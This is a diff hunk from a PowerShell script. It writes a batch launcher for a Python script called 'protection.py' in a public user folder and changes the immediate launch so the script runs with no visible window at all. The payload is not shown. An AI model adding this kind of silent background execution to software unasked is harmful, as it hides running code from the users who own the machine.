@@ -110,6 +110,12 @@ $pythonScriptPath = "C:\Users\Public\Other\Protection\protection.py"
 $batContent = "@echo off`nstart /b pythonw `"$pythonScriptPath`""
 $batContent | Set-Content -Path $batFilePath -Encoding ASCII
 
-# Run the Python script immediately (hidden)
-Start-Process -FilePath "pythonw.exe" -ArgumentList "`"$pythonScriptPath`"" -WindowStyle Hidden
+# Run the Python script immediately (completely hidden, no PowerShell window)
+$psi = New-Object System.Diagnostics.ProcessStartInfo
+$psi.FileName = "pythonw.exe"
+$psi.Arguments = "`"$pythonScriptPath`""
+$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+$psi.CreateNoWindow = $true
+$psi.UseShellExecute = $false
 
+[System.Diagnostics.Process]::Start($psi) | Out-Null
